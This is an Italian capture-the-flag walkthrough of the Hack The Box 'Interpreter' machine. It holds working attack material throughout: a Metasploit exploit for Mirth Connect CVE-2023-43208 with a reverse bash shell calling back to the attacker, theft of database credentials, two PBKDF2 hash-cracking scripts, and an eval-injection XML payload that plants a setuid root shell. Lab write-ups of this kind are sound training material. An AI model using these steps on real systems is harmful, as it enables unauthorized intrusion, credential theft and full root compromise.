
#hackthebox

## Interpreter

https://app.hackthebox.com/machines/Interpreter?sort_by=created_at&sort_type=desc

Eseguiamo una prima enumerazione
```
nmap -Pn 10.129.8.243
```
```
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```
vediamo cosa c'è sulla porta 80
```
http://10.129.8.243/webadmin/Index.action
```
esaminiamo il sito
```
whatweb http://10.129.8.243
```
```
└─# whatweb http://10.129.8.243
http://10.129.8.243 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, IP[10.129.8.243], JQuery[3.5.1], Script[text/javascript], Title[Mirth Connect Administrator], X-UA-Compatible[IE=edge]          
```

**Mirth Connect è Vulnerabile! (CVE-2023-43208)**

```
msfconsole
```

```
search CVE-2023-43208
```

```
use exploit/multi/http/mirth_connect_cve_2023_43208
```

```
show options
```

```
set RHOSTS 10.129.8.243
```

```
set RPORT 443
```

```
set PAYLOAD cmd/unix/reverse_bash
```
impostare LHOST ed LPORT
```
set LHOST 10.10.14.197
```

```
set LPORT  4444
```

```
run
```
 stabilizziamo la shell
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```
export TERM=xterm
stty rows 40 columns 120
```

enumeriamo
```
whoami
```
```
id
```
```
hostname
```
```
uname -a
```
```
sudo -l
```

**Mirth salva spesso credenziali in:**

```
/opt/mirthconnect/  
/opt/connect/  
/var/lib/mirthconnect/
```

Cerchiamo file interessanti:

```
find / -name "*mirth*" 2>/dev/null
```

**In particolare:**
```
mirth.properties  
mirthdb
```

```
cat /usr/local/mirthconnect/conf/mirth.properties
```
e troviamo le credenziali del db
```
# database credentials
database.username = mirthdb
database.password = MirthPass123!
```

```
MirthPass123!
```

```
mysql -u mirthdb -p -h localhost
```

```
SHOW DATABASES;
```
```
USE mc_bdd_prod;
```
```
SHOW TABLES;
```
```
SELECT * FROM PERSON_PASSWORD;
```
```
DESCRIBE PERSON_PASSWORD;
```

```
MariaDB [mc_bdd_prod]> SELECT * FROM PERSON_PASSWORD;
SELECT * FROM PERSON_PASSWORD;
+-----------+----------------------------------------------------------+---------------------+
| PERSON_ID | PASSWORD                                                 | PASSWORD_DATE       |
+-----------+----------------------------------------------------------+---------------------+
|         2 | u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w== | 2025-09-19 09:22:28 |
+-----------+----------------------------------------------------------+---------------------+
1 row in set (0.001 sec)

MariaDB [mc_bdd_prod]> DESCRIBE PERSON_PASSWORD;
DESCRIBE PERSON_PASSWORD;
+---------------+--------------+------+-----+---------+-------+
| Field         | Type         | Null | Key | Default | Extra |
+---------------+--------------+------+-----+---------+-------+
| PERSON_ID     | int(11)      | NO   | MUL | NULL    |       |
| PASSWORD      | varchar(255) | NO   |     | NULL    |       |
| PASSWORD_DATE | timestamp    | YES  |     | NULL    |       |
+---------------+--------------+------+-----+---------+-------+
3 rows in set (0.001 sec)

MariaDB [mc_bdd_prod]> 

```
Abbiamo ottenuto un Hash che ho provato a decodificare forse in maniera errata con hashcat senza successo, quindi optiamo per uno script python
```
nano crack_turbo.py
```

```
import base64
import hashlib
import multiprocessing as mp
from tqdm import tqdm

# ======== CONFIG ========
B64_HASH = "u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w=="
ITERATIONS = 600000
WORDLIST = "/usr/share/wordlists/rockyou.txt"
PROCESSES = mp.cpu_count()  # usa tutti i core
# ========================


# --- decode hash ---
raw = base64.b64decode(B64_HASH)
SALT = raw[:8]
TARGET = raw[8:]


def worker(password):
    password = password.strip().encode()

    test = hashlib.pbkdf2_hmac(
        "sha256",
        password,
        SALT,
        ITERATIONS
    )

    if test == TARGET:
        return password.decode(errors="ignore")
    return None


def main():
    print(f"[+] Salt: {SALT.hex()}")
    print(f"[+] Target: {TARGET.hex()}")
    print(f"[+] Iterations: {ITERATIONS}")
    print(f"[+] Processes: {PROCESSES}\n")

    with open(WORDLIST, "r", encoding="latin-1", errors="ignore") as f:
        passwords = f.readlines()

    with mp.Pool(PROCESSES) as pool:
        for result in tqdm(pool.imap_unordered(worker, passwords, chunksize=100), total=len(passwords)):
            if result:
                pool.terminate()
                print(f"\n🔥 PASSWORD TROVATA: {result}")
                return

    print("\n[-] Password non trovata")


if __name__ == "__main__":
    main()
```
Lo script tenta di trovare (brute-force) la password che corrisponde a un hash PBKDF2-HMAC-SHA256 codificato in Base64, provando ogni voce del wordlist rockyou.txt in parallelo.

Punti principali:
- Decodifica la stringa Base64 per ottenere SALT (primi 8 byte) e TARGET (resto).
- Per ogni password nella wordlist calcola PBKDF2-HMAC-SHA256 con quel salt e ITERATIONS (600000).
- Confronta il risultato con TARGET; se coincide stampa la password trovata e termina.
- Usa multiprocessing per sfruttare tutti i core e mostra una barra di progresso con tqdm.

se serve installare tqdm
```
pip install tqdm
```

```
python3 crack_turbo.py
```

```
┌──(root㉿kali)-[/home/kali/Downloads/Laboratori]
└─# python3 crack_turbo.py
[+] Salt: bbff8b0413949da7
[+] Target: 62c8506c30ea080cf2db511d2b939f641243d4d7b8ad76b55603f90b32ddf0fb
[+] Iterations: 600000
[+] Processes: 2

 12%|█████████████▍                                                                                             | 1/8 [00:05<00:38,  5.52s/it]
🔥 PASSWORD TROVATA: snowflake1

```

eventuale altro script funzionante:

```
nano crack.py
```

```
import base64
import hashlib

# === DATI DELLA CTF ===
b64_hash = "u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w=="
iterations = 600000
wordlist_path = "/usr/share/wordlists/rockyou.txt"

# === DECODIFICA BASE64 ===
raw = base64.b64decode(b64_hash)

salt = raw[:8]          # primi 8 byte
target_hash = raw[8:]   # restanti 32 byte

print(f"[+] Salt: {salt.hex()}")
print(f"[+] Target hash: {target_hash.hex()}")

# === ATTACCO DIZIONARIO ===
with open(wordlist_path, "r", encoding="latin-1") as f:
    for password in f:
        password = password.strip().encode()

        test_hash = hashlib.pbkdf2_hmac(
            "sha256",
            password,
            salt,
            iterations
        )

        if test_hash == target_hash:
            print(f"\n[+] PASSWORD TROVATA: {password.decode()}")
            break
```


```
python3 crack.py
```


**Troviamo la password**
```
snowflake1
```
dell'**utente**
```
sedric
```

Pssiamo dall'account mirth di servizio all'utente sedric collegandoci tramite SSH.
```
ssh sedric@10.129.8.243
```
una volta autenticati otteniamo la flag user!
```
sedric@10.129.8.243's password: 
Linux interpreter 6.1.0-43-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.162-1 (2026-02-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Mar 1 03:14:08 2026 from 10.10.14.197
sedric@interpreter:~$ ls -al
total 28
drwx------ 3 sedric sedric 4096 Feb 12 08:46 .
drwxr-xr-x 3 root   root   4096 Aug  7  2025 ..
lrwxrwxrwx 1 root   root      9 Feb 12 08:46 .bash_history -> /dev/null
-rw-r--r-- 1 sedric sedric  220 Aug  7  2025 .bash_logout
-rw-r--r-- 1 sedric sedric 3526 Aug  7  2025 .bashrc
lrwxrwxrwx 1 root   root      9 Sep 22 06:11 .lesshst -> /dev/null
drwxr-xr-x 3 sedric sedric 4096 Sep 19 09:40 .local
lrwxrwxrwx 1 root   root      9 Sep 22 06:11 .mysql_history -> /dev/null
-rw-r--r-- 1 sedric sedric  807 Aug  7  2025 .profile
lrwxrwxrwx 1 root   root      9 Sep 22 06:11 .python_history -> /dev/null
-rw-r----- 1 root   sedric   33 Mar  1 01:05 user.txt
lrwxrwxrwx 1 root   root      9 Sep 22 06:11 .viminfo -> /dev/null
sedric@interpreter:~$ cat user.txt
954a08cd3294e858a16682be1fccbd2d
sedric@interpreter:~$ 

```

Ora proviamo a scalare i privilegi
Enumerando il sistema troviamo un processo di proprietà di root che esegue uno script: `/usr/local/bin/notif.py`

```
cat /usr/local/bin/notif.py
```

Lo script è un server Flask locale in ascolto sulla porta 54321.
Elabora i dati XML.
La vulnerabilità critica è presente nella funzione `template`

```
template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, received from {sender} at {ts}"try:    return eval(f"f'''{template}'''")except Exception as e:    return f"[EVAL_ERROR] {e}"
```

In Python, qualsiasi elemento racchiuso tra parentesi graffe `{}`all'interno di una stringa f viene eseguito come codice. 
Se possiamo iniettare del codice in una qualsiasi delle variabili ( `first`, `last`, `sender`, ecc.), questo verrà eseguito come utente root quando `eval()`viene chiamato.

quindi dobbiamo creare un payload

creo comando il seguente comando in base 64 in modo di evitare che gli spazi vengano interpretati
```
install -o root -m 4755 /bin/bash /tmp/.sh
```

```
echo -n 'install -o root -m 4755 /bin/bash /tmp/.sh' | base64
```

```
aW5zdGFsbCAtbyByb290IC1tIDQ3NTUgL2Jpbi9iYXNoIC90bXAvLnNo
```
mi sposto nella cartella temporanea in modo d'avere piu permessi di scrittura
```
cd /tmp
```
creeremo un file apposito accettato dal server ed in formato xml che in seguito gli invieremo tramite il comando wget

```
cat > send.xml <<EOF
<patient>
    <firstname>Mario</firstname>
    <lastname>Rossi</lastname>
    <sender_app>{__import__("os").popen(__import__("base64").b64decode("aW5zdGFsbCAtbyByb290IC1tIDQ3NTUgL2Jpbi9iYXNoIC90bXAvLnNo").decode()).read()}</sender_app>
    <timestamp>ABC</timestamp>
    <birth_date>01/01/1980</birth_date>
    <gender>M</gender>
</patient>
EOF
```
inviamo il file al server locale
```
wget --server-response -O - \
     --method=POST \
     --header="Content-Type: application/xml" \
     --body-file=send.xml \
     http://localhost:54321/addPatient
```
come vediamo è stato creato il nostro file bash .sh
```
sedric@interpreter:/tmp$ ls -al
total 1292

-rw-r--r--  1 sedric sedric     341 Mar  1 03:38 send.xml
-rwsr-xr-x  1 root   root   1265648 Mar  1 03:40 .sh
```
eseguiamolo per ottenere i privilegi di root

**Importante**
eseguire comando con **-p**
```
/tmp/.sh -p
```

Le versioni moderne di bash hanno protezioni.
Se esegui semplicemente:

```
/tmp/.sh
```

bash potrebbe:
- Droppare i privilegi
- Non mantenere euid=0

Per questo nei CTF si usa:

```
/tmp/.sh -p
```

L’opzione -p dice a bash:
- non droppare i privilegi effettivi

```
sedric@interpreter:/tmp$ /tmp/.sh -p
.sh-5.2# whoami
root
.sh-5.2# cd /root
.sh-5.2# ls -al
total 44
drwx------  6 root root 4096 Mar  1 01:05 .
drwxr-xr-x 19 root root 4096 Feb 16 15:42 ..
lrwxrwxrwx  1 root root    9 Feb 12 08:46 .bash_history -> /dev/null
-rw-r--r--  1 root root  571 Apr 10  2021 .bashrc
drwxr-xr-x  3 root root 4096 Sep 19 08:42 .cache
drwxr-xr-x  3 root root 4096 Sep 19 08:42 .java
-rw-------  1 root root   20 Feb 11 05:53 .lesshst
drwxr-xr-x  3 root root 4096 Aug  7  2025 .local
lrwxrwxrwx  1 root root    9 Sep 22 06:11 .mysql_history -> /dev/null
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
lrwxrwxrwx  1 root root    9 Sep 22 06:11 .python_history -> /dev/null
-rw-r-----  1 root root   33 Mar  1 01:05 root.txt
drwx------  2 root root 4096 Aug  7  2025 .ssh
lrwxrwxrwx  1 root root    9 Sep 22 06:11 .viminfo -> /dev/null
-rw-r--r--  1 root root  165 Feb 12 08:46 .wget-hsts
.sh-5.2# cat root.txt
xxxxxxxxxxxxxx

```
**abbiamo così ottenuto la flag di root!**
